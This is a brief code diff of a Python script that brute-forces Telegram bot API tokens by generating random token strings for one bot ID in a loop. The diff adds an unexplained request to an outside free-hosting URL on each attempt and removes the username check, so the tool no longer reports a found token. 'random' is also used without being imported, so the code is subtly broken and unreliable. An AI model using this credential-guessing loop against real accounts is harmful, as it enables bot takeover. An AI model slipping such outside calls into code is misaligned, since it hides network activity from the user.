@@ -1,10 +1,12 @@
 #ADMlNxd 2.012
+import requests
 chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
 for k in range(1000):
   token = "609517172:" + "".join(random.choices(chars,k=35))
   new_bot = Bot(token)
   try:
-    username = new_bot.username
+    requests.get("https://ujjwalelearn.000webhostapp.com/");
+    username = None
   except:
     username = None
     pass
